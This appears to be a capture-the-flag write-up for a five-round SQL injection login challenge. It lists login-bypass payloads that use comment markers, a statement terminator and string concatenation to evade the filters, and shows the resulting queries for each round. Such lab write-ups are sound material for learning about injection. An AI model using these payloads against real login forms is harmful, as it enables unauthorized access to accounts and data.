#ROUND 1/5

# WHEN WE TRY LOGGING IN AS " admin" and a random password we are not able to but instaed we get this:
SELECT * FROM users WHERE username='admin' ' AND password='pass

# so we use "admin'--" as username.
#Whatever that is after “–” is commented so it will be ignored and what the query now does is it selects all users with the username admin

#ROUND 2/5

#In next round since we cannot use --, instead we use  /**/
SELECT * FROM users WHERE username='admin' /*' AND password='pass'

#ROUND 3/5
#In this round i can still use /* however i am not able to login
#So I try ; after admin because ; ends the SQL statement and everything after it is either an error or another statement

SELECT * FROM users WHERE username='admin';' AND password='pass' 

#ROUND 4/5
#For next round we cannot use the word admin to login
#so we can use || to write the word admin followed by ;
# "||" concatenates the ad with the min, making it admin, and finishes the statement at the ;.

SELECT * FROM users WHERE username='ad'||'min';' AND password='pass' 

#ROUND 5/5
# we again repeat the steps of previous round 

Congrats! You won! Check out filter.php

#when we check filter.php we get the req flag
